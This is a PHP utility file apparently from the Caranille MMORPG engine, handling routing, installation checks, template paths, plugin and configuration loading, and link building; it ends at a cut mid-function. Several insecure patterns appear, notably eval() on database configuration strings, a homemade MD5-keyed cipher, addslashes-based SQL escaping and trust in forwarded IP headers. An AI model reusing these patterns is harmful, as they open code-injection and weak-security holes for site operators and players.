<?php


function _mod_rewrite()
{
	if(function_exists('apache_get_modules') )
	{
		debug_log("apache_get_modules exists");
		
		if(in_array('mod_rewrite',apache_get_modules()))
		{
			debug_log("mod_rewrite activé");
			return true ;
		}
		else
		{
			debug_log("mod_rewrite desactivé");
		}
	}
	else
	{
		debug_log("apache_get_modules non exists");
	}
	
	
	if(isset($_SERVER['HTTP_MOD_REWRITE']))
	{
		//echo "l'info est indiqué dans la Globale _SERVER_ ...<br/>";
		if (getenv('HTTP_MOD_REWRITE') === 'On')
		{
			//echo "mod_rewrite activé<br/>";
			return true;			
		}
		else
		{
			//echo "mod_rewrite desactivé<br/>";
		}
	}
	else
	{
		//echo "l'info n'est pas indiqué dans la Globale _SERVER_ ...<br/>";
	}
	//if (strpos(shell_exec('/usr/local/apache/bin/apachectl -l'), 'mod_rewrite') !== false)
	//	return true;
	
	return false ;
}

// added by Dimitri

/** verifie l'etape d'installation de Caranille **/
function verif_install()
{
	global $bdd, $_configured;
	
	// pas de fichier de configuration
	if(!$_configured) return 1 ;
	
	// la base n'existe pas, meme si le fichier de config a été généré
	if(is_null($bdd)) return 2 ;
	
	if(!test_db('%Configuration')) return 2 ;
	
	$install_Data = get_db('install_config');
		
	// à partir d'ici, l'index de la derniere etape procedée est en base
	if(isset($install_Data)) return $install_Data['Configuration_Value'];
	
	// la base et le fichier ont été créé, pas l'enregistrement....
	return 2;
}

function isInstalling()
{
	global $install_step ;
		
	if($install_step > 4)
	{
		if(request_confirm('install'))
		{
			return true ;
		}
		
		return false ;
	}
	else
		return true ;

}
/**
function base64_encode_image ($filename=string,$filetype=string) {
    if ($filename) {
        $imgbinary = fread(fopen($filename, "r"), filesize($filename));
        return 'data:image/' . $filetype . ';base64,' . base64_encode($imgbinary);
    }
}
**/

function path_design_layout($file="Left")
{
	global $_path , $MMORPG_Template;
		
	if(file_exists($_path."Design/".$MMORPG_Template."/HTML/".$file.'.php'))
		return($_path."Design/".$MMORPG_Template.'/HTML/'.$file.'.php');
		
	return($_path."Design/Caranille_dev/HTML/".$file.'.php');

}

function path_design_template($file="Left")
{
	global $_path , $MMORPG_Template;
		
	if(file_exists($_path."Design/".$MMORPG_Template."/Templates/".$file.'.php'))
		return($_path."Design/".$MMORPG_Template.'/Templates/'.$file.'.php');
		
	return($_path."Design/Caranille_dev/Templates/".$file.'.php');

}

function list_plugins_installed()
{
	global $plugin_path , $installing , $install_step ;
	
	if(!$installing && $install_step ==5)
	{
		$l = array();
		
		if($dossier = opendir($plugin_path))
		{
			while(false !== ($fichier = readdir($dossier)))
			{
				if($fichier != '.' && $fichier != '..' && is_dir($plugin_path."/".$fichier) )
				{
					//require_once($plugin_path."/".$fichier."/index.php");
					$l[] = $fichier;
				}
			}
			
			closedir($dossier);
		}
		
		return $l ;
	}
}

function list_plugings_db()
{
	global $installing , $install_step ;
	
	if(!$installing && $install_step ==5)
	{
		$l = list_plugins_installed();
		$list['ref'] = implode("','",$l);
		
		$f = list_db("list_plugins",$list);
			
		return $f ;
	}
}

function list_pages()
{
	global $installing , $install_step ;
	
	if(!$installing && $install_step ==5)
	{
		$t = list_db("list_pages");
		
		$menu = array();
		
		if(!empty($t))
			foreach($t as $f)
				$menu[$f['Page_Slug']] = $f['Page_Title'];
			
		return $menu ;
	}
}

function load_plugin()
{
	global $plugin_path , $MMORPG_Template;
	
	$f = list_plugings_db();
	
	if(!empty($f))
	{
		foreach($f as $p)
		{
			if($p['Plugin_Active']==1)
			{
				require_once($plugin_path."/".$p['Plugin_Name']."/index.php");
			}
		}
	}
}
function load_config()
{		
	if(!isInstalling())
	{			
		$recuperation_donnees_jeu = list_db('all_config');
		
		if(!empty($recuperation_donnees_jeu))
		{
			foreach($recuperation_donnees_jeu as $donnees_jeu )
			{
				extract($donnees_jeu) ;

				if(is_numeric($Configuration_Value))
				{
					debug_log("\$Config['".$Configuration_Name."'] = floatval(".$Configuration_Value.");");
					eval("\$Config['".$Configuration_Name."'] = floatval(".$Configuration_Value.");") ;
				}
				else
				{
					debug_log("\$Config['".$Configuration_Name."'] = '".$Configuration_Value."';");
					eval("\$Config['".$Configuration_Name."'] = '".$Configuration_Value."';") ;
				}
			}
			
			return $Config ;
		}
	}
	else
	{
	
    	return array(
    	    "MMORPG_Presentation" =>"",
        	'MMORPG_Template' => "Caranille_dev",
        	'MMORPG_Access' => 'No',
        	'MMORPG_Description' => "",
            'MMORPG_Name' =>"",
            'money_tx' => 1 , 
            'money_nb' => 1 ,
    	);
	}
}	
		
function load_layout_config()
{
	$MMORPG_Presentation ="";
	$MMORPG_Template = "Caranille_dev";
	$MMORPG_Access = 'No';
	$MMORPG_Description = "";
	$MMORPG_Name ="";
		
	if(!isInstalling())
	{			
		$recuperation_donnees_jeu = list_db('layout_config');
		
		if(!empty($recuperation_donnees_jeu))
		{
			foreach($recuperation_donnees_jeu as $donnees_jeu )
			{			
				if($donnees_jeu['Configuration_Name'] === 'MMORPG_Access' )
				{
					$MMORPG_Access = stripslashes($donnees_jeu['Configuration_Value']);
				}
				if($donnees_jeu['Configuration_Name'] === 'MMORPG_Description' )
				{
					$MMORPG_Description = stripslashes($donnees_jeu['Configuration_Value']);
				}
				if($donnees_jeu['Configuration_Name'] === 'MMORPG_Name' )
				{
					$MMORPG_Name = stripslashes($donnees_jeu['Configuration_Value']);
				}
				
				if($donnees_jeu['Configuration_Name'] === 'MMORPG_Presentation' )
				{
					$MMORPG_Presentation = stripslashes($donnees_jeu['Configuration_Value']);
				}
				
				if($donnees_jeu['Configuration_Name'] === 'MMORPG_Template' )
				{
					$MMORPG_Template = stripslashes($donnees_jeu['Configuration_Value']);
				}
			}			
		}
	}
	return array($MMORPG_Access,$MMORPG_Name,$MMORPG_Description,$MMORPG_Presentation,$MMORPG_Template);
}

function load_image_config()
{
	$avatar_maxsize = 100 ;
	$avatar_maxh = 1 ;
	$avatar_maxl = 1 ;
	
	if(!isInstalling())
	{	
		$conf = list_db('image_config');
	
		if(!empty($conf))
		{
			foreach($conf as $donnees_jeu )
			{
				if($donnees_jeu['Configuration_Name'] === 'avatar_maxsize' )
				{
					$avatar_maxsize = stripslashes($donnees_jeu['Configuration_Value']);
				}
				if($donnees_jeu['Configuration_Name'] === 'avatar_maxh' )
				{
					$avatar_maxh = stripslashes($donnees_jeu['Configuration_Value']);
				}
				if($donnees_jeu['Configuration_Name'] === 'avatar_maxl' )
				{
					$avatar_maxl = stripslashes($donnees_jeu['Configuration_Value']);
				}
			}
		}
	}
	return array( $avatar_maxsize,$avatar_maxh,$avatar_maxl ); 
}

function list_modules()
{
	global $_path;
	
	//$modules = array() ;
	
	if($dossier = opendir($_path.'/Sources'))
	{
		while(false !== ($fichier = readdir($dossier)))
		{			
			if( $fichier != '.' && $fichier != '..' && is_dir($_path.'/Sources/'.$fichier)) //( $fichier != 'index.php') 
			{
				$modules[] = $fichier ;
			}
		}
		
		closedir($dossier);

	}
	
	return $modules ;
}

function list_positions()
{
	global $_path  , $MMORPG_Template ;
	
	//$modules = array();
	
	if($dossier = opendir($_path."Design/".$MMORPG_Template."/Templates"))
	{
		while(false !== ($fichier = readdir($dossier)))
		{
			if($fichier != '.' && $fichier != '..' && !is_dir($_path."Design/".$MMORPG_Template."/Templates/".$fichier)) //( $fichier != 'index.php')
			{
				$modules[] = $fichier ;
			}
		}
		
		closedir($dossier);

	}
	
	return $modules ;
}

function list_menu($module)
{
	global $_path;
	
	if($dossier = opendir($_path.'/Sources/'.$module.'/Modules'))
	{
		while(false !== ($fichier = readdir($dossier)))
		{
			if($fichier != '.' && $fichier != '..' && !is_dir($_path.'/Sources/'.$module.'/Modules/'.$fichier)) //( $fichier != 'index.php')
			{
				$modules[] = str_replace('.php','',$fichier) ;
			}
		}
		
		closedir($dossier);

	}
	
	return $modules ;
}

function path_template($file="Left",$directory="Public")
{
	global $_path  ;
	//echo "-->$file,$directory<br/>";
	//echo 'recherche :: '.$_path.'Sources/'.$directory.'/Templates/'.$file.'.php';
	if($directory=="" ||strcasecmp($directory,'User')===0)
	{
		$d = (verif_connect(true)? "Game" : "Public" );
		
		if(file_exists($_path.'Sources/'.$d.'/Templates/'.$file.'.php') )
			return($_path.'Sources/'.$d.'/Templates/'.$file.'.php');
	}
	else
	{
		if(file_exists($_path.'Sources/'.$directory.'/Templates/'.$file.'.php') )
			return($_path.'Sources/'.$directory.'/Templates/'.$file.'.php');
	}
	return null ; //echo $file.' indisponible';
}

function path_source($file="Index",$Module="Main",$directory="Public")
{
	global $_path , $MMORPG_Template ;
	
	// plugins dans le repertoire design...
	if(file_exists($_path.'Design/'.$MMORPG_Template.'/Modules/'.$Module.'/'.$file.'.php') )
		return($_path.'Design/'.$MMORPG_Template.'/Modules/'.$Module.'/'.$file.'.php');
	
	//echo $_path.'Design/'.$MMORPG_Template.'/Modules/'.$Module.'/'.$file.'.php<br/>';
	
	if(file_exists($_path.'Sources/'.$directory.'/'.$file.'.php') )//--/Modules/'.$Module.'
		return($_path.'Sources/'.$directory.'/'.$file.'.php');//--/Modules/'.$Module.'
	
	echo $_path.'Sources/'.$directory.'/Modules/'.$Module.'/'.$file.'.php<br/>';
	echo $file.' indisponible';
	
	return null ; //
}

function path_module($Module="Main",$directory="Public")
{
	global $_path ,$install_step , $installing, $MMORPG_Template ;
	
	debug_log( "theoric final path :: ".$_path.'Sources/'.$directory.'/Modules/'.$Module.'.php',false);

	if($installing && $install_step < 5 )
	{
		debug_log("non installé...",false);
		if(file_exists($_path.'Sources/Install/Modules/Index.php') )
			return($_path.'Sources/Install/Modules/Index.php');
	}
	/**else
	if(file_exists($_path.'Design/'.$MMORPG_Template."/".$Module.'.php') )
		return($_path.'Design/'.$MMORPG_Template."/".$Module.'.php');
	else**/
	if(file_exists($_path.'Sources/'.$directory.'/Modules/'.$Module.'.php') )
		return($_path.'Sources/'.$directory.'/Modules/'.$Module.'.php');
	else
	{
		if(verif_connect(true))
		{
			if(file_exists($_path.'Sources/Game/Modules/Character.php') )
				return($_path.'Sources/Game/Modules/Character.php');
		}
		else
		{
			if(file_exists($_path.'Sources/Public/Modules/Main.php') )
				return($_path.'Sources/Public/Modules/Main.php');
				
			return false ;
		}
	}
	
	debug_log( $file.' indisponible',false);
	
	return false ;
}

function path_view($Module="Main",$directory="Public")
{
	global $_path, $installing , $install_step , $MMORPG_Template  ;
	
	debug_log( "theoric final path(view) :: ".$_path.'Sources/'.$directory.'/Views/'.$Module.'.php',false);
/*	
	if($directory === "Contenu" || $directory === "contenu" || $directory ==="Content" || $directory ==="content" )
	{
		if(file_exists($_path.'Sources/'.$directory.'/'.$Module.'.php') )
			return($_path.'Sources/'.$directory.'/'.$Module.'.php');
	}
	else
	*/
	if($installing && $install_step < 5 )
	{
		debug_log("non installé...",false);
		if(file_exists($_path.'Sources/Install/Views/Index.php') )
			return($_path.'Sources/Install/Views/Index.php');
	}
	else
	if($directory=="Public" && file_exists($_path.'Design/'.$MMORPG_Template."/".$Module.'.php') )
		return($_path.'Design/'.$MMORPG_Template."/".$Module.'.php');
	else
	if(file_exists($_path.'Sources/'.$directory.'/Views/'.$Module.'.php') )
		return($_path.'Sources/'.$directory.'/Views/'.$Module.'.php');
	else
	{
		if(verif_connect(true))
		{
			if(file_exists($_path.'Sources/Game/Views/Character.php') )
				return($_path.'Sources/Game/Views/Character.php');
		}
		else
		{
			if(file_exists($_path.'Sources/Public/Views/Main.php') )
				return($_path.'Sources/Public/Views/Main.php');
				
			return false ;
		}
			return false ;
	}
	//	 echo $Module.' view indisponible';
			return false ;
}

function path_layout($file="Header",$directory="Public")
{
	global $_path ;
	
	if(file_exists($_path.'Sources/'.$directory.'/HTML/'.$file.'.php') )
		return($_path.'Sources/'.$directory.'/HTML/'.$file.'.php');
	else
	{
		if(verif_connect(true))
		{
			if(file_exists($_path.'Sources/Game/HTML/'.$file.'.php') )
				return($_path.'Sources/Game/HTML/'.$file.'.php');
		}
		else
		{
			if(file_exists($_path.'Sources/Public/HTML/'.$file.'.php') )
				return($_path.'Sources/Public/HTML/'.$file.'.php');
		}
	}
	return null;	// echo $file.' indisponible';
}

function get_module_and_page()
{
	global $_rewrite, $_configured, $install_step, $installing , $_url;

	$secteur_module = null;
	$page = null;

	if($_rewrite && $_configured && !$installing && $install_step > 4 )
	{
		$request = isset( $_SERVER['SCRIPT_URI'] ) ?  getenv('SCRIPT_URI') :  getProtocol().'://'.getenv('HTTP_HOST').getenv('REQUEST_URI') ;
		
		$adresse = str_replace('.html', '',$request );
		$adresse2 = str_replace($_url, '', $adresse);
		$adresse1 = str_replace( $_SERVER['REQUEST_SCHEME'],'',$adresse2);
		
		debug_log("request : $request");
		debug_log("adresse : $adresse");
		debug_log("_url : $_url");
		debug_log("adresse2 : $adresse2");
		debug_log("adresse1 : $adresse1");
		
		@list($secteur,$page) = explode('/', $adresse1);
		
		debug_log("l-511 array($page,$secteur)");
		
		if(empty($secteur)&& $installing)
		{
			$secteur = "Install";
			$page = "Index" ;
			
		}
		else
		if(empty($secteur)&& $installing)
		{
			$secteur = "Public";
			$page = "Main" ;
			
		}
		else
		if(empty($page) && $installing)
		{
			$page = $secteur ;
			$secteur = "Install";
		}
		else
		if(empty($page) && !$installing)
		{
			$page = $secteur ;
			$secteur = "Public";
		}
		
		$pos = stripos($page, '?');

		debug_log("l-515 $pos");
		
		if ($pos !== false) 
		{	
			@list($page,$params) = explode('?', $page);			
		}	
		else
		{
			$shift = explode('/', $adresse1 );//$adresse1)
			$line_up= array_slice($shift, 2) ;
			$params  = str_replace("-","=",implode('&',$line_up));
			
			debug_log("shift : ".print_r($shift,1));
			debug_log("line_up : ".print_r($line_up ,1));
		}
		
		if(isset($params) && !empty($params))
		{
			debug_log("params : ".$params);
			parse_str($params, $_REQUEST);
			parse_str($params, $_GET);
			debug_log("_REQUEST : ".print_r($_REQUEST,1));	
			debug_log("_GET : ".print_r($_GET,1));	
		}
	}
	else
	{	
		if(!empty($_GET))
		{
			$secteur = key($_GET);
			$page = $_GET[$secteur];
		}
		else
		{
			$secteur = "Public" ;
		}
	}
	
	if($installing)$secteur = 'Install';

	debug_log("install_step::$install_step ,installing::$installing,_configured::$_configured ,_rewrite::$_rewrite, secteur::$secteur , page::$page",false);
	 // print_r($_GET);
	if($install_step < 5 || strcasecmp($secteur, "install") == 0)// {$secteur === "Install" || $secteur === "install" )
	{
		$secteur_module = "Install";
		//$page = "Index";
	}
	elseif(is_null($secteur)) // racine par defaut
	{		
		$secteur_module = (verif_connect(true)? "Game" : "Public" );
		$page = (verif_connect(true)? "Character" : "Main" );		
	}
	elseif(is_null($page)) //partie public
	{	
		$page = $secteur;
		$secteur_module = (verif_connect(true)? "Game" : "Public" );
	}
	else 
	{
		if(strcasecmp($secteur, "public") == 0)//$secteur === "Public" || $secteur === "public" )
		{
			$secteur_module = ucfirst($secteur);
		}
		//elseif(strcasecmp($secteur, "licence") == 0)//$secteur == "Licence" )
		//{
		//	$modules = "LICENCE.txt";
		//}
		elseif(strripos($secteur, "conten"))//strcasecmp($secteur, "contenu") == 0)//$secteur === "Contenu" || $secteur === "contenu" || $secteur ==="Content" || $secteur ==="content" )
		{
			$secteur_module = ucfirst($secteur);
		}
		elseif(strcasecmp($secteur, "game") == 0)// $secteur === "game" || $secteur === "Game" ) // partie principale - reecriture desactivée
		{
			$secteur_module = ucfirst($secteur);
		}
		elseif(!$installing) // installation terminée
		{		
			$secteur_module = ucfirst($secteur);
		}
		//else
		//	$modules = "Sources/Install/index.php";
	}
	debug_log("return array($page,$secteur_module)",false);
	
	return array($page,$secteur_module);
}

function get_design($Module)
{
	global $_path, $_url, $MMORPG_Template;
		
	if(file_exists($_path."Design/".$MMORPG_Template."/".$Module))
		return $_url."Design/".$MMORPG_Template."/".$Module;
}

/** 
 * gere la construction des liens en absolue
 * @param $Module => la page
 * @param $directory => le repertoire
 * @author Dimitri
 * exemple <a href='". get_Link("Main","Admin") ?>" >Administration</a>
 */
function get_link($Module="Main",$directory="",$params = array() )
{
	global $_url, $_path , $_rewrite, $install_step ,$installing, $_configured , $MMORPG_Template ;

	$parametres ="";
	
	if(!empty($params))
	{
		foreach($params as $key => $value)
		{
			if($key!="")
			{
				if($_rewrite && $_configured && !$installing && $install_step > 4)
					$parametres .= $key."-".$value."/";
				else
					$parametres .= $key."=".$value."&";
			}
		}
	}

	if($_rewrite && $_configured && !$installing && $install_step > 4)
		$parametres = rtrim($parametres,"/");	
	else
		$parametres = rtrim($parametres,"&");	
	
	if($installing &&  $install_step < 5)
	{
		return $_url."index.php?install=$Module".($parametres !="" ? '&'.$parametres : '' );
	}
	
	debug_log("get_link($Module) caranile is installed") ;
	
	if(strcasecmp($Module, "install") == 0)// ($Module==="Install" )
		if(file_exists($_path."Sources/Install/index.php"))
			if($_rewrite && $_configured && !$installing && $install_step > 4)
				return $_url."install".($parametres !="" ? '?'.$parametres : '' ).".html";
			else
				return $_url."index.php?install=index";
				
	if(strcasecmp($directory, "install") == 0)// ($directory==="Install")
		if(file_exists($_path."Sources/Contenu/$Module.php"))
			if($_rewrite && $_configured && !$installing && $install_step > 4)
				return $_url."install/".$Module.($parametres !="" ? '/'.$parametres : '' ).".html";
			else
				return $_url."index.php?install=$Module";
	
	debug_log("get_link($Module) install is not required");
	
	if($directory =="")
		if(file_exists($_path.'Design/'.$MMORPG_Template."/".$Module.'.php') )
			if($_rewrite && $_configured && !$installing && $install_step > 4)
				return $_url.$Module.($parametres !="" ? '/'.$parametres : '' ).".html";
			else
				return $_url."index.php?Public=".$Module;
			//return($_path.'Templates/'.$MMORPG_Template."/".$Module.'.php');
	
	debug_log("get_link($Module,$MMORPG_Template) not template page");
	
	switch(ucfirst($directory))
	{	
		case '':
		default :{
			if(file_exists($_path."Sources/Public/Modules/".ucfirst($Module).".php"))
				if($_rewrite)
					return $_url.strtolower($Module).($parametres !="" ? '/'.$parametres : '' ).".html";
				else
					return $_url."index.php?public=$Module".($parametres !="" ? '&'.$parametres : '' );
		}break;

		case 'Map':{
			
			if(ucfirst($Module)=='Map')
				$Module = verif_town(true) ? 'Town' : 'World' ;
				
			if(file_exists($_path."Sources/".ucfirst($directory)."/Modules/".ucfirst($Module).".php"))
			{		
				if($_rewrite)
					return $_url.strtolower($directory)."/".strtolower($Module).($parametres !="" ? '/'.$parametres : '' ).".html";
				else
					return $_url."index.php?".strtolower($directory)."=".strtolower($Module).($parametres !="" ? '&'.$parametres : '' );
			}
			else
			{
				debug_log("file not exists($_path/Sources/".ucfirst($directory)."/Modules/".ucfirst($Module).".php)",false);
			}
		}break;
		
		case 'Register' :{
		    
		    $step = isset(	$_SESSION['Account_Register']['step']) ? $_SESSION['Account_Register']['step'] : 1 ;

		        
		        if($step === 1) $Module = 'Members';
		    elseif($step === 2) $Module = 'Order';
		    elseif($step === 3) $Module = 'Race';
		    elseif($step === 4) $Module = 'Classe';
		    elseif($step === 5) $Module = 'Bonus';
		    elseif($step === 6) $Module = 'End';
		    else                $Module = 'Members';
		    
		    
		   	if(file_exists($_path."Sources/".ucfirst($directory)."/Modules/".ucfirst($Module).".php"))
			{		
				if($_rewrite)
					return $_url.strtolower($directory)."/".strtolower($Module).($parametres !="" ? '/'.$parametres : '' ).".html";
				else
					return $_url."index.php?".strtolower($directory)."=".strtolower($Module).($parametres !="" ? '&'.$parametres : '' );
			}
			else
			{
				debug_log("file not exists($_path/Sources/".ucfirst($directory)."/Modules/".ucfirst($Module).".php)",false);
			}
			
		}break;
		
		case 'Chat' :
		case 'Public':
		case 'Forum':
		case 'User':
		case 'Game':
		case 'Guild':
		case 'Admin' :
		case 'Battle':
		case 'Moderator' :{
		
			if(file_exists($_path."Sources/".ucfirst($directory)."/Modules/".ucfirst($Module).".php"))
			{
				debug_log("file exists($_path/Sources/".ucfirst($directory)."/Modules/".ucfirst($Module).".php)",false);
		
				if($_rewrite)
					$final_link = $_url.strtolower($directory)."/".strtolower($Module).($parametres !="" ? '/'.$parametres : '' ).".html";
				else
					$final_link = $_url."index.php?".strtolower($directory)."=".strtolower($Module).($parametres !="" ? '&'.$parametres : '' );
					
				return $final_link ;
			}
			else
			{
				debug_log("file not exists($_path/Sources/".ucfirst($directory)."/Modules/".ucfirst($Module).".php)",false);
			}
		}break;
		
		case 'Shop' :{
		
			if(file_exists($_path."Sources/".ucfirst($directory)."/Modules/Index.php"))
			{		
				if($_rewrite)
					return $_url.strtolower($directory)."/".strtolower($Module).($parametres !="" ? '/'.$parametres : '' ).".html";
				else
					return $_url."index.php?".strtolower($directory)."=".strtolower($Module).($parametres !="" ? '&'.$parametres : '' );
			}
			
		}break;
/**		
		case 'Chat' :{
			if(file_exists($_path."Sources/User/Modules/".$directory."/".ucfirst($Module).".php"))
				if($_rewrite)
					return $_url.strtolower($directory)."/".strtolower($Module).".html".($parametres !="" ? '?'.$parametres : '' );
				else
					return $_url."?".strtolower($directory)."=".strtolower($Module)."";
		}break;
**/		
		case 'Contenu' :
		case 'Content' :{ // pages institutionnelles  | A propos | Contact | Mentions légales | Règlement | FAQ
			if(file_exists($_path."Sources/Contenu/Modules/Index.php")) //".ucfirst($Module)."
				if($_rewrite)
					return $_url."Contenu/".strtolower($Module).($parametres !="" ? '/'.$parametres : '' ).".html";
				else
					return $_url."index.php?contenu=".strtolower($Module).($parametres !="" ? '&'.$parametres : '' );
		}break;
		
		case 'Gallery' :{ // capture d'ecran		
			if(file_exists($_path."Design/Images/".$directory."/".$Module))
				return $_url."Design/Images/".$directory."/".$Module.($parametres !="" ? '&'.$parametres : '' );
		}break;
	}
}

function get_url()
{
    if(!isset($_SERVER['SCRIPT_URI']))
	{
		$local_url = getProtocol().'://'.get_Hostname().getenv('SCRIPT_NAME');
	}
	else
	{
		$local_url = getenv('SCRIPT_URI');
	}
	$local_url = str_replace ('index.php','',$local_url);
	$local_url = str_replace ('Install/','',$local_url);
        
	return ($local_url);//strtolower) ;
}


/**
 * password_decode()
 * Décode une chaine encodée par password_decode().
 * La fonction ne retournera la chaine d'origine que si le mot de passe utilisé pour décoder est le même que celui utilisé pour encoder. 
 * Dans le cas ou le mot de passe est différent, la fonction retournera une autre chaine.
 **/
function password_decode($filter, $str) 
{
   $filter = md5($filter);
   $letter = -1;
   $newstr = '';
   $str = base64_decode($str);
   $strlen = strlen($str);

   for ( $i = 0; $i < $strlen; $i++ )
   {
	  $letter++;

	  if ( $letter > 31 )
		 $letter = 0;

	  $neword = ord($str{$i}) - ord($filter{$letter});

	  if ( $neword < 1 )
		 $neword += 256;
		 
	  $newstr .= chr($neword);
   }

   return $newstr;
}

/** 
 * inscrit les données d'un array dans un gabarit  HTML
 * pouvoir ajouter un répertoire view avec des fichier HTML 
 * plutot que d'avoir <?php echo $var ?> dans test.php , on aura [var] dans test.html
 * et il sera plus simple pour les utilisateur d'utiliser et modifier test.html
 * @param $fileTemplate
 * @param $content
 */
function buildViewFromTemplate($fileTemplate, $content=array())
{		
	$template = file_get_contents($fileTemplate);
	
	//error_log("data before integration($fileTemplate) :: ".print_r($content,1));
	
	foreach ($content as $key => $prop) 
	{
		$template = str_replace( "[$key]" , html_entity_decode((string)$prop ,ENT_QUOTES , "UTF-8" ), $template);
	}
	
	//error_log("look integration($fileTemplate) :: ".$template);	
		
	return $template;
}

/**
 * password_encode()
 * Encode un texte, ou tout autre chaine de caractères 
 * (les chaines binaires marchent aussi, comme les fichiers image) en utilisant un mot de passe.
 **/
function password_encode($filter, $str)
{
   $filter = md5($filter);
   $letter = -1;
   $newstr = '';

   $strlen = strlen($str);

   for ( $i = 0; $i < $strlen; $i++ )
   {
	  $letter++;
              
	  if ( $letter > 31 )
		 $letter = 0;
              
	  $neword = ord($str{$i}) + ord($filter{$letter});

              if ( $neword > 255 )
		 $neword -= 256;
                
                $newstr .= chr($neword);
   }

   return base64_encode($newstr);
}

 /**
 *
 * Fonction recursive qui supprime l'effet des magic quotes
 * à utiliser pour l'affichage des données
 * il faut la retravailler. j'ai quelques cas où ça suprrime aussi les retour chariot
 * @param $var
 */
function stripslashes_r($var)
{
    //print_array($var, 'stripslashes_r');
	
        if(is_array($var) ) // Si la variable passée en argument est un array, on appelle la fonction stripslashes_r dessus
            foreach($var as $champs => $value)
                $var[$champs] = stripslashes_r($value) ;
    else
        if(is_object($var)) // Si la variable passée en argument est un object, on appelle la fonction stripslashes_r dessus
            foreach($var as $champs => $value)
                $var->{$champs} = stripslashes_r($value) ;
    else // Sinon, un simple stripslashes suffit
        {   
			//$var = str_replace("\\", '\ ', $var);
			//$var = str_replace("\'", "'", $var);
			
			$var = stripslashes($var);
			$var = trim($var) ;
        }
        return $var ;
}

/**
 * fonction recursive pour un prevenir les injection SQL dans le code
 * pour toute variable envoyé vers la base de données
 * il faut la retravailler. j'ai quelques cas où ça suprrime aussi les retour chariot
 */
function addslashes_r($var, $toHtml = false)
{
    if(is_array($var)) // Si la variable pass?e en argument est un array, on appelle la fonction addslashes_r dessus
        foreach($var as $champs => $value)
            $var[$champs] = addslashes_r($value, $toHtml) ;
     else
        if(is_object($var)) // Si la variable passée en argument est un object, on appelle la fonction stripslashes_r dessus
            foreach($var as $champs => $value)
                $var->{$champs} = addslashes_r($value) ;
    else // Sinon, le grand nettoyage
    {
		$var = trim(stripslashes($var)) ;                               
        $var = trim(addslashes($var)) ;  
		//htmlspecialchars(stripslashes(trim(strip_tags(
        //$var = mysql_real_escape_string($var);
       
        if(is_numeric($var))
            $var = intval($var);
        else
            $var = $toHtml ? htmlentities($var) : $var;           
    }
    return $var ;
}

function securite_bdd($string)
	{
		// On regarde si le type de string est un nombre entier (int)
		if(ctype_digit($string))
		{
			$string = intval($string);
		}
		// Pour tous les autres types
		else
		{
			$string = mysql_real_escape_string($string);
			$string = addcslashes($string, '%_');
		}
		
		return $string;
	}


/**
 * 	recuperation de l'adresse IP du client 
 * @property on cherche d'abord a savoir 
 * <li> si c'est une connection partagée</li>
 * <li> si il est derrière un proxy</li>
 * @return la vraie adresse IP
 **/
function getRealIpAddr() 
{
	// check si c'est une connection partagée
		if( getenv('HTTP_CLIENT_IP') != null ) 
			$ip=getenv('HTTP_CLIENT_IP');
	else // check si ça passe au travers d'un proxy
		if( getenv('HTTP_X_FORWARDED_FOR') != null ) 
			$ip=getenv('HTTP_X_FORWARDED_FOR');
	else // c'est une connexion normale
			$ip=getenv('REMOTE_ADDR');
			
	return $ip;
}

/** 
 * return le type de protocol
 */
function getProtocol()
{
	if( strtolower(substr(getenv("SERVER_PROTOCOL"),0,5))=='https' )
			$p ='https' ;
	else
		if( getenv('HTTPS') == 'on') 
			$p = 'https';
	else
		if(getenv("REQUEST_SCHEME")!='')
			$p = getenv("REQUEST_SCHEME");
	else 
			$p = 'http';
			
	return $p ;
}

/** 
 * return le nom du server
 */
function get_Hostname()
{
		if( getenv('SERVER_NAME') != null) 
			$host = getenv('SERVER_NAME') ;
	else
		if( getenv('HTTP_HOST') != null )
			$host = getenv('HTTP_HOST');
	else
			$host = getenv('SERVER_ADDR');
	
	return $host; //.':'.getenv('SERVER_PORT');
}

function getBrowser() 
{ 
    $u_agent = $_SERVER['HTTP_USER_AGENT']; 
    $bname = 'Unknown';
    $platform = 'Unknown';
    $version= "";

    //First get the platform?
    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'linux';
    }
    elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'mac';
    }
    elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'windows';
    }
    
    // Next get the name of the useragent yes seperately and for good reason
    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)) 
    { 
        $bname = 'Internet Explorer'; 
        $ub = "MSIE"; 
    } 
    elseif(preg_match('/Firefox/i',$u_agent)) 
    { 
        $bname = 'Mozilla Firefox'; 
        $ub = "Firefox"; 
    } 
    elseif(preg_match('/Chrome/i',$u_agent)) 
    { 
        $bname = 'Google Chrome'; 
        $ub = "Chrome"; 
    } 
    elseif(preg_match('/Safari/i',$u_agent)) 
    { 
        $bname = 'Apple Safari'; 
        $ub = "Safari"; 
    } 
    elseif(preg_match('/Opera/i',$u_agent)) 
    { 
        $bname = 'Opera'; 
        $ub = "Opera"; 
    } 
    elseif(preg_match('/Netscape/i',$u_agent)) 
    { 
        $bname = 'Netscape'; 
        $ub = "Netscape"; 
    } 
    
    // finally get the correct version number
    $known = array('Version', $ub, 'other');
    $pattern = '#(?<browser>' . join('|', $known) .
    ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {
        // we have no matching number just continue
    }
    
    // see how many we have
    $i = count($matches['browser']);
    if ($i != 1) {
        //we will have two since we are not using 'other' argument yet
        //see if version is before or after the name
        if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
            $version= $matches['version'][0];
        }
        else {
            $version= $matches['version'][1];
        }
    }
    else {
        $version= $matches['version'][0];
    }
    
    // check if we have a number
    if ($version==null || $version=="") {$version="?";}
    
    return array(
        'userAgent' => $u_agent,
        'name'      => $bname,
        'version'   => $version,
        'platform'  => $platform,
        'pattern'    => $pattern
    );
} 


/** verifie si une variable existe bien dans les données envoyes **/
function request_confirm($key)
{
    debug_log("request_confirm(GET-$key)::".(isset($_GET[$key]) && !empty($_GET[$key]) ? "true" : "false" ) );

	if(isset($_GET[$key])) return true ;

	debug_log("request_confirm(POST-$key)::".(isset($_POST[$key]) && !empty($_POST[$key]) ? "true" : "false" ) );

	if(isset($_POST[$key])) return true ;
	
	debug_log("request_confirm($key)::".(isset($_REQUEST[$key]) && !empty($_REQUEST[$key]) ? "true" : "false" ) );
	//$REQUEST reunit les infos de POST et de GET
	return isset($_REQUEST[$key]) && !empty($_REQUEST[$key]) ? true : false ;
	
